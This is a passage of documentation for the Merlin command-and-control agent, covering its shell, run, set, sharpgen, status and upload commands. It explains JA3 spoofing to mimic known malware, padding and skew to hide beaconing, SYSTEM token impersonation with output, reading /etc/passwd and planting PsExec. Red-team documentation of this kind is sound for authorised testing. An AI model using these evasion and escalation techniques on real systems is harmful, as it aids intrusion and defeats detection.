    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe "Get-Service -Name \"win*\" -Exclude "WinRM" | fl"

**OR**

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run powershell.exe 'Get-Service -Name \'win*\' -Exclude 'WinRM' | fl'

Escape Sequence
^^^^^^^^^^^^^^^

Following along with the Quoted Arguments section above, the ``\`` symbol will be interpreted as an escape sequence.
This is beneficial because it can be used to escape other characters like the pipe symbol, ``|`` .
However, it can work against you when working with Windows file paths and the arguments are not enclosed in quotes.

This command will fail because the ``\`` itself needs to escaped. Notice the error message shows ``C:WindowsSystem32``:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run cmd.exe /c C:\Windows\System32
    [-]Created job hBYxRfaRBG for agent 21a0fc5f-14ad-4c43-b41e-57eab1feb0e1
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job hBYxRfaRBG
    [+]'C:WindowsSystem32' is not recognized as an internal or external command,
    operable program or batch file.
    [!]exit status 1

To correctly issue the command either escape the ``\`` or enclose the commands in quotes:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» run cmd.exe /c dir C:\\Windows\\System32

set
---

The ``set`` command is used to provide the agent with instructions on controlling itself and/or its configuration. There are several control types to include:

* ja3_
* killdate_
* maxretry_
* padding_
* skew_
* sleep_

.. _ja3:

ja3
^^^

`JA3 is a method for fingerprinting TLS clients on the wire <https://engineering.salesforce.com/tls-fingerprinting-with-ja3-and-ja3s-247362855967>`_. Every TLS client has a unique signature depending on its configuration of the following TLS options: ``SSLVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats``.

The ``ja3`` option allows the agent to create a TLS client based on the provided JA3 hash signature. This is useful to evade detections based on a JA3 hash for a known tool (e.g.,. Merlin). `This <https://engineering.salesforce.com/gquic-protocol-analysis-and-fingerprinting-in-zeek-a4178855d75f>`_ article documents a JA3 fingerprint for Merlin. Known JA3 signatures can be downloaded from https://ja3er.com/

.. note::
    Make sure the input JA3 hash will enable communications with the Server. For example, if you leverage a JA3 hash that only supports SSLv2 and the server does not support that protocol, then they will not be able to communicate. The ``-ja3`` flag will override the the ``-proto`` flag and will cause the agent to use the protocol provided in the JA3 hash.

This example will create a TLS client with a JA3 hash of ``51a7ad14509fd614c7bb3a50c4982b8c`` that matches Java based malware such as Neutrino and Nuclear Exploit Kit (EK).

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set ja3 769,49161-49171-47-49156-49166-51-50-49159-49169-5-49154-49164-49160-49170-10-49155-49165-22-19-4-255,10-11-0,23-1-3-19-21-6-7-9-10-24-11-12-25-13-14-15-16-17-2-18-4-5-20-8-22,0
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
    [-] Created job DWXtIAdjYz for agent c1090dbc-f2f7-4d90-a241-86e0c0217786 at 2020-08-20T14:36:34Z

.. _killdate:

killdate
^^^^^^^^

Killdate is a UNIX timestamp that denotes a time the executable will not run after (if it is 0 it will not be used). Killdate is checked before the agent performs each checkin, including before the initial checkin.

Killdate can be set in the agent/agent.go file before compiling, in the New function instantiation of a new agent. One scenario for using the killdate feature is an agent is persisted as a service and you want it to stop functioning after a certain date, in case the target organization fails to remediate the malicious service. Using killdate here would stop the agent from functioning after a certain specified UNIX system time.

The Killdate can also be set or changed for running agents using the ``set killdate`` command from the agent menu. This will only modify the killdate for the running agent in memory and will not update the compiled binary file. http://unixtimestamp.50x.eu/ can be used to generate a UNIX timestamp.

A UNIX timestamp of `0` will read like `1970-01-01T00:00:00Z` in the agent info table.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set killdate 811123200
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job utpISXXXbl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

.. _maxretry:

maxretry
^^^^^^^^

The ``maxretry`` control type is used to change the _maximum_ number of failed login an agent will allow before the agent quits. For the sake of this conversation, a login means establishing contact with a Merlin Server and receiving no errors. The default is 7. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the ``agent info`` command.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set maxretry 50
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job utpISXXXbl for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

.. _padding:

padding
^^^^^^^

The ``padding`` control type is used to change the _maximum_ size of a message's padding. A random value between 0 and the maximum padding value is selected on a per message basis and added to the end of each message. This is used in an attempt to evade detection when a program looks for messages with same size beaconing out. The default is 4096. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the ``agent info`` command.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set padding 8192
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job wlGTwgtqNx for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

.. _skew:

skew
^^^^

The ``skew`` command is used to introduce a jitter or skew to the agent sleep time to keep traffic from occurring at exact time intervals.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set skew 5
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job lyYQdxckTY for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»

.. _sleep:

sleep
^^^^^

The ``sleep`` control type is used to change the amount of time that an agent will sleep before checking in again. The default is 30 seconds. The values provided to this command are written in a time format. For example, ``30s`` is 30 seconds and ``60m`` is 60 minutes. There is no response on the CLI after the instruction has been provided to the agent. You can verify the setting was changed using the ``agent info`` command.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» set sleep 15s
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job npMYqwASOD for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

sharpgen
--------

.. warning::
    The .NET Core 2.1 SDK must be manually installed by the operator and the SharpGen executable must be built before the ``sharpgen`` command can be used

The ``sharpgen`` command leverages Ryan Cobb's `SharpGen <https://github.com/cobbr/SharpGen>`_ project and the `.NET Core 2.1 SDK <https://dotnet.microsoft.com/download/dotnet-core/2.1>`_ to dynamically compile and execute .NET assemblies. After assembly is compiled, the same steps documented in `execute-assembly`_ are followed. SharpGen also leverages functionality from the `SharpSploit <https://github.com/cobbr/SharpSploit>`_ project that can be called directly from this ``shargen`` command. This command uses a hardcoded output that places compiled executables to the Merlin root directory as ``sharpgen.exe``.

For more granular control and additional configuration options, use the ``windows/x64/csharp/misc/SharpGen`` module.

SharpGen is git a submodule in the ``data/src/cobbr/SharpGen`` directory. From this directory, run the ``dotnet build -c release`` command to build the ``SharpGen.dll`` executable.

The ``sharpgen`` command is executed as: ``shaprgen <code> [<spawnto path> <spawnto args>]``

The ``code`` positional argument is the .NET code you want to compile and execute. All code is automatically wraped in ``Console.WriteLine();`` and it does not need to be included again. All other arguments are optional. The ``<spawnto path>`` argument is the process that will be started on the target and where the shellcode will be injected and executed. If a ``<spawnto path>`` is not provided, ``C:\WIndows\System32\dllhost.exe`` will be used. The ``<spawnto args>`` value is used as an argument when starting the spawnto process.

.. note::
    Use ``\`` to escape any characters inside of the code argument and use quotes to enclose the entire code argument (e.g., ``"new Tokens().MakeToken(\"RAstley\", \"\", \"P@ssword\")"``)

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» sharpgen "new SharpSploit.Credentials.Tokens().GetSystem()"
    [-] Created job oeOBXfBuPS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786

    [+] Results for c1090dbc-f2f7-4d90-a241-86e0c0217786 job oeOBXfBuPS

    Getting system...
    Impersonate NT AUTHORITY\SYSTEM...
    Processes for NT AUTHORITY\SYSTEM: 25
    Attempting to impersonate: NT AUTHORITY\SYSTEM
    Attempting to impersonate: NT AUTHORITY\SYSTEM
    Impersonated: NT AUTHORITY\SYSTEM
    True

shell
-----

The ``shell`` command is used to task the agent to execute the provided arguments using the operating system's default
shell and return STDOUT/STDERR. On Windows the ``%COMSPEC%`` shell is used and if it is ``cmd.exe`` then the ``/c``
argument is used. For macOS and Linux, the ``/bin/sh`` shell is used with the ``-c`` argument.
Use the run_ command to execute a program directly without invoking the shell.

Example using ``ver``:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell ver
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job IxVXgyIkhS for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
    [+]Results for job IxVXgyIkhS

    Microsoft Windows [Version 10.0.16299.64]

Shell Functions
^^^^^^^^^^^^^^^

Some commands and capabilities are components of a shell and can *ONLY* be used with a shell.
For example, the ``dir`` command is a component of ``cmd.exe`` and is not its own program executable.
Therefore, ``dir`` can only be used within the ``cmd.exe`` shell.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell dir

The pipe and redirection characters ``|`` , ``>`` , and ``<`` , are also functions of a shell environment.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell "cat /etc/passwd | grep root"

Quoted Arguments
^^^^^^^^^^^^^^^^

When running a command on an agent from the server, the provided arguments are passed to executable that was called.
As long as there are no special characters (e.g., ``\`` , ``&`` , ``;`` , ``|`` , ``>`` , ``<`` etc.) the command will be processed fine.

For example, this command will work fine because it does not have any special characters:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe Get-Service -Name win* -Exclude WinRM

However, this command **WILL** fail because of the ``|`` symbol. The command will still execute, but will stop processing everything after the ``|`` symbol.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe Get-Service -Name win* -Exclude WinRM | fl

To circumvent this, enclose the entire argument in quotes. The outer most quotes will be removed when the arguments are
passed. The argument can be enclosed in double quotes or single quotes. All other quotes need to be escaped
The command be executed in both of these ways:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe "Get-Service -Name win* -Exclude WinRM | fl"

**OR**

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe "Get-Service -Name \"win*\" -Exclude "WinRM" | fl"

**OR**

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell powershell.exe 'Get-Service -Name \'win*\' -Exclude 'WinRM' | fl'

Escape Sequence
^^^^^^^^^^^^^^^

Following along with the Quoted Arguments section above, the ``\`` symbol will be interpreted as an escape sequence.
This is beneficial because it can be used to escape other characters like the pipe symbol, ``|`` .
However, it can work against you when working with Windows file paths and the arguments are not enclosed in quotes.

This command will fail because the ``\`` itself needs to escaped. Notice the error message shows File Not Found:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell dir C:\Windows\System32
    [-]Created job hBYxRfaRBG for agent 21a0fc5f-14ad-4c43-b41e-57eab1feb0e1
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job hBYxRfaRBG
    [+]  Volume in drive C has no label.
     Volume Serial Number is AC57-CFB9

     Directory of C:\

    File Not Found

To correctly issue the command either escape the ``\`` or enclose the commands in quotes:

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» shell dir C:\\Windows\\System32

status
------

The ``status`` command is used to simply print if the Merlin Agent is Active, Delayed, or Dead to the screen. This becomes useful when you come back to Merlin after a couple of hours or if you want to see if your shell has died.

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» status
    Active
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»

upload
------

The ``upload`` command is used to upload a file *from* the Merlin server *to* the host where the Merlin agent is running. The command is called by proving the location of the file on the Merlin server followed by the location to save the file on the host where the Merlin agent is running.

.. note::
    Because ``\`` is used to escape a character, file paths require two (e.g., ``C:\\Windows``)

.. note::
    Enclose file paths containing a space with quotation marks (e.g.,. ``"C:\\Windows\\Program Files\\"``)

.. code-block:: text

    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» upload C:\\SysinternalsSuite\\PsExec.exe C:\\Windows\\PsExec.exe
    Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job vXJsZdZLPP for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
